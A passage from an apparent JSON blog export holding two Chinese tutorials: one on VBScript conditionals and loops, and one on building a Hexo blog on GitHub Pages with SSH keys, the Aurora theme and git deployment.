function\n\n\n\n\n调用程序这个简单的函数程序被调用来计算两个参数的和：\n实例（仅适用于 IE）12345Function myfunction(a,b)myfunction=a+bEnd Functiondocument.write(myfunction(5,9))\n\n函数 “myfunction” 将返回参数 “a” 和参数 “b” 的和。这里返回的是 14。\n当调用程序时，可以使用 Call 语句，如下所示：\n1Call MyProc(argument)\n\n或者，可以省略 Call 语句，如下所示：\n1MyProc argument\n\nVBScript 条件语句\n条件语句条件语句用于根据不同的情况执行不同的操作。\n在 VBScript 中，可以使用四种条件语句：\n\nIf 语句 - 假如希望在条件为 true 时执行一系列的代码，可以使用这个语句\nIf…Then…Else 语句 - 假如希望执行两套代码其中之一，可以使用这个语句\nIf…Then…ElseIf 语句 - 假如希望选择多套代码之一来执行，可以使用这个语句\nSelect Case 语句 - 假如希望选择多套代码之一来执行，可以使用这个语句\n\n\nIf…Then…Else在下面的情况中，可以使用 If…Then…Else 语句：\n\n在条件为 true 时，执行某段代码\n选择两段代码之一来执行\n\n如果在条件为 true 时只执行一条语句，可以把代码写为一行：\n1If i=10 Then alert(&quot;Hello&quot;)\n\n在上面的代码中，没有 ..Else.. 语句。我们仅仅让代码在条件为 true 时（当 i&#x3D;10 时）执行一项操作。\n如果在条件为 true 时执行不止一条语句，那么就必须在一行写一条语句，然后使用关键词 “End If” 来结束这个语句：\n1234If i=10 Thenalert(&quot;Hello&quot;)i = i+1End If\n\n在上面的代码中，同样没有 ..Else.. 语句。我们仅仅让代码在条件为 true 时执行了多项操作。\n假如想要在条件为 true 时执行某条语句，并在条件不为 true 时执行另一条语句，就必须添加关键词 “Else”：\n实例（仅适用于 IE）12345678&lt;script type=&quot;text/vbscript&quot;&gt;i=hour(time)If i &lt; 10 Thendocument.write(&quot;Good morning!&quot;)Elsedocument.write(&quot;Have a nice day!&quot;)End If&lt;/script&gt;\n\n在上面的代码中，当条件为 true 时会执行第一段代码，当条件不成立时执行第二段代码（当 i 大于 10 时）。\n\nIf…Then…ElseIf如果想要选择多套代码之一来执行，可以使用 If…Then…ElseIf 语句：\n实例（仅适用于 IE）\n1234567891011121314&lt;script type=&quot;text/vbscript&quot;&gt;i=hour(time)If i = 10 Thendocument.write(&quot;Just started...!&quot;)ElseIf i = 11 Thendocument.write(&quot;Hungry!&quot;)ElseIf i = 12 Thendocument.write(&quot;Ah, lunch-time!&quot;)ElseIf i = 16 Thendocument.write(&quot;Time to go home!&quot;)Elsedocument.write(&quot;Unknown&quot;)End If&lt;/script&gt;\n\n\n\nSelect Case如果想要选择多套代码之一来执行，可以使用 “Select Case” 语句：\n实例（仅适用于 IE）12345678910111213141516171819&lt;script type=&quot;text/vbscript&quot;&gt;d=weekday(date)Select Case dCase 1document.write(&quot;Sleepy Sunday&quot;)Case 2document.write(&quot;Monday again!&quot;)Case 3document.write(&quot;Just Tuesday!&quot;)Case 4document.write(&quot;Wednesday!&quot;)Case 5document.write(&quot;Thursday...&quot;)Case 6document.write(&quot;Finally Friday!&quot;)Case elsedocument.write(&quot;Super Saturday!!!!&quot;)End Select&lt;/script&gt;\n\n以上代码的工作原理：首先，需要一个简单的表达式（常常是一个变量），并且这个表达式会被做一次求值运算。然后，表达式的值会与每个 Case 中的值作比较。如果匹配，被匹配的 Case 所对应的代码会被执行。\nVBScript 循环\n循环语句循环语句用于运行相同的代码块指定的次数。\n在 VBScript 中，可以使用四种循环语句：\n\nFor…Next 语句 - 运行一段代码指定的次数\nFor Each…Next 语句 - 针对集合中的每个项目或者数组中的每个元素来运行某段代码\nDo…Loop 语句 - 运行循环，当条件为 true 或者直到条件为 true 时\nWhile…Wend 语句 - 不要使用这个语句 - 请使用 Do…Loop 语句代替它\n\n\nFor…Next 循环请使用 For…Next 语句运行一段代码指定的次数。\nFor 语句规定计数变量（i）以及它的初始值和结束值。Next 语句会以 1 作为步进值来递增变量（i）。\n实例1234567891011&lt;html&gt;&lt;body&gt;&lt;script type=&quot;text/vbscript&quot;&gt;For i = 0 To 5document.write(&quot;The number is &quot; &amp; i &amp; &quot;&lt;br /&gt;&quot;)Next&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;\n\nStep 关键词通过 Step 关键词，可以规定计数变量递增或递减的步进值。\n在下面的实例中，计数变量（i）每次循环的递增步进值为 2。\n123For i=2 To 10 Step 2some codeNext\n\n如果要递减计数变量，就必须使用负的 Step 值。并且必须规定小于开始值的结束值。\n在下面的实例中，计数变量（i）每次循环的递减步进值为 2。\n123For i=10 To 2 Step -2some codeNext\n\n退出 For…Next可以通过 Exit For 关键词退出 For…Next 语句。\n1234For i=1 To 10If i=5 Then Exit Forsome codeNext\n\n\nFor Each…Next 循环For Each…Next 针对集合中的每个项目或者数组中的每个元素来重复运行某段代码。\n实例12345678910111213141516&lt;html&gt;&lt;body&gt;&lt;script type=&quot;text/vbscript&quot;&gt;Dim cars(2)cars(0)=&quot;Volvo&quot;cars(1)=&quot;Saab&quot;cars(2)=&quot;BMW&quot;For Each x In carsdocument.write(x &amp; &quot;&lt;br /&gt;&quot;)Next&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;\n\n\nDo…Loop如果不知道重复多少次，可以使用 Do…Loop 语句。\nDo…Loop 语句重复执行某段代码直到条件是 true 或条件变成 true。\n重复执行代码直到条件是 true可以使用 While 关键字来检查 Do… Loop 语句的条件。\n123Do While i&gt;10some codeLoop\n\n如果 i 等于 9，上述循环内的代码将终止执行。\n123Dosome codeLoop While i&gt;10\n\n这个循环内的代码将被执行至少一次，即使 i 小于 10。\n重复执行代码直到条件变成 true可以使用 Until 关键字来检查 Do…Loop 语句的条件。\n123Do Until i=10some codeLoop\n\n如果 i 等于 10，上述循环内的代码将终止执行。\n123Dosome codeLoop Until i=10\n\n这个循环内的代码将被执行至少一次，即使 i 等于 10。\n退出 Do…Loop可以通过 Exit Do 关键词退出 Do…Loop 语句。\n1234Do Until i=10i=i-1If i&lt;10 Then Exit DoLoop\n\n这个循环内的代码，只要 i 不为 10 且 i 大于 10 时都将被执行。\n","slug":"VBScript教程","date":"2022-03-15T14:05:53.000Z","categories_index":"编程","tags_index":"编程,VBScript","author_index":"0netry"},{"id":"f48f1848e82a474528d06090473058c1","title":"GitHub搭建自己的博客","content":"安装Node.js根据自己的电脑安装对应的版本，安装选项全部默认，一路点击Next。\n安装好之后，按Win+R打开命令提示符，输入node -v和npm -v，如果出现版本号，则表示安装成功。\n\n\n\n\n添加国内镜像源或使用cnpm如果没有梯子的话，可以使用阿里的国内镜像进行加速\n1npm config set registry https://registry.npm.taobao.org\n\n或安装淘宝cnpm\n1npm install -g cnpm --registry=https://registry.npm.taobao.org\n\n\n\n安装Hexo首先新建一个文件夹，用来存放自己的博客文件。\n在该目录下右键点击Git Bash Here，打开git的控制台窗口。\n定位到该目录下，输入npm i hexo-cli -g安装Hexo。会有几个报错，无视它就行。\n安装完后输入hexo -v验证是否安装成功。\n然后输入hexo init初始化文件夹，接着输入npm install安装必备的组件。\n这样本地的网站配置也弄好啦，输入hexo g生成静态网页，然后输入hexo s打开本地服务器，然后浏览器打开http://localhost:4000/，就可以看到博客啦。\n注：①按ctrl+c关闭本地服务器，若无法结束，则打开任务管理器，结束名为Node.js JavaScript Runtime的任务即可。\n② 卸载hexo命令npm uninstall hexo-cli -g。\n连接Github与本地首先右键打开git bash，然后输入下面命令：\n12git config --global user.name &quot;username&quot;git config --global user.email &quot;your email address&quot;\n\n用户名和邮箱根据注册github的信息自行修改。\n配置ssh① 首先在用户主目录下使用如下命令查看SSH keys是否存在\n12ls -al ~/.sshLists the files in your .ssh directory, if they exist\n\n② 若不存在，打开用户主目录，Git Bash Here，使用如下命令创建SSH Key：\n1ssh-keygen -t rsa -C &quot;youremail@example.com&quot;\n\n你需要把邮件地址换成你自己的邮件地址，然后一路回车，使用默认值即可，由于这个Key也不是用于军事目的，所以也无需设置密码。\n如果一切顺利的话，可以在用户主目录里找到.ssh目录，里面有id_rsa和id_rsa.pub两个文件，这两个就是SSH Key的秘钥对，id_rsa是私钥，不能泄露出去，id_rsa.pub是公钥，可以放心地告诉任何人。\n\n\n\n\n③  SSH key创建成功后，cd .ssh进入.ssh文件夹，cat id_rsa.pub查看公钥内容\n④ 登陆GitHub，打开“Account settings”，“SSH Keys”页面：\n然后，点“Add SSH Key”，填上任意Title，在Key文本框里粘贴id_rsa.pub文件的内容\n\n\n\n\n更改主题这里以使用Aurora主题为例：\n步骤 1 - 安装主题① 在控制台中，进入 Hexo 项目的根目录，然后运行以下命令安装主题\n1npm install hexo-theme-aurora --save\n\n步骤 2 - 生成主题配置因为主题是使用 NPM 或者 Yarn 安装的，而不是 clone 到 themes 文件夹的。所以需要自己创建一个配置文件。只需要在 Hexo 博客的根目录下创建一个 _config.aurora.yml 配置文件来配置主题。\n获取一个默认的主题配置模版\n\n可以执行以下命令，但是这个命令只能在 Linux 或者 MacOS 下执行，如果你用的是 Windows 系统，可以自行在 node_modules 中找到对应目录复制过来\n\n1cp -rf ./node_modules/hexo-theme-aurora/_config.yml ./_config.aurora.yml\n\n步骤 3 - 设置permalink\n\n\n\n\n\n\n\n\n因为使用了 Vue-router，Hexo 默认生成的页面和文章的 permalink 与 Vue router 中的 path 是不相符的，就会出现无法访问的问题。所以需要修改 Hexo 默认配置文件里面的 permalink 参数。\n#步骤 3.1打开在 Hexo 根目录下的 _config.yml\n#步骤 3.2修改 permalink 参数为 /post/:title.html\n12345678# URL## Set your site url here. For example, if you use GitHub Page, set url as &#x27;https://username.github.io/project&#x27;url: https://tridiamond.techpermalink: /post/:title.htmlpermalink_defaults:pretty_urls:  trailing_index: true # Set to false to remove trailing &#x27;index.html&#x27; from permalinks  trailing_html: true # Set to false to remove trailing &#x27;.html&#x27; from permalinks\n\n步骤4 - 重新生成与本地服务器\n\n\n\n\n\n\n\n\n使用以下命令来运行本地环境。\n1hexo clean &amp; hexo g &amp; hexo server\n\n提示\n改变了任何配置都需要重新生成 Hexo 的静态文件！\n当文件都生成完毕之后，就可以通过 https://localhost:4000在新窗口打开 访问你的博客了。\n写文章、发布文章首先在博客根目录下右键打开git bash，安装一个扩展npm i hexo-deployer-git。\n然后输入hexo new post &quot;article title&quot;，新建一篇文章。\n然后打开D:\\study\\program\\blog\\source\\_posts的目录，可以发现下面多了一个文件夹和一个.md文件，一个用来存放你的图片等数据，另一个就是你的文章文件啦。\n编写完markdown文件后，根目录下输入hexo g生成静态网页，然后输入hexo s可以本地预览效果，最后输入hexo d上传到github上。这时打开你的github.io主页就能看到发布的文章啦。\n注意事项：修改分支由于在_config.yml中设置了提交分支为master，所以需要在GitHub中也进行设置\n仓库首页，默认是main，修改成master\n\n\n\n\nSettings -&gt; Pages -&gt;Source，默认是main，修改成master并Save\n\n\n\n\n配置 _config.yml中有关deploy的部分如果你一切都配置好了，发布上传很容易，一句hexo d就搞定，当然关键还是你要把所有东西配置好。\n首先，ssh key肯定要配置好。\n其次，配置_config.yml中有关deploy的部分：\n正确写法：\n1234deploy:  type: git  repository: git@github.com:liuxianan/liuxianan.github.io.git  branch: master\n\n错误写法：\n1234deploy:  type: github  repository: https://github.com/liuxianan/liuxianan.github.io.git  branch: master\n\n后面一种写法是hexo2.x的写法，现在已经不行了，无论是哪种写法，此时直接执行hexo d的话一般会报如下错误：\n1Deployer not found: github 或者 Deployer not found: git\n\n原因是还需要安装一个插件：\n1npm install hexo-deployer-git --save\n\n其它命令不确定，部署这个命令一定要用git bash，否则会提示Permission denied (publickey).\n打开你的git bash，输入hexo d就会将本次有改动的代码全部提交，没有改动的不会\n遇到的问题hexo g 时报错 err: Error: Cannot find module ‘truncate-html’\n\n解决办法根据报错安装对应的模块npm install module_name\n参考超详细Hexo+Github博客搭建小白教程\n使用hexo+github搭建免费个人博客详细教程\nGitHub+Hexo 搭建个人网站详细教程\nHexo Aurora中文指南\n","slug":"GitHub搭建自己的博客","date":"2022-02-15T15:24:16.000Z","categories_index":"","tags_index":"搭建博客","author_index":"0netry"}]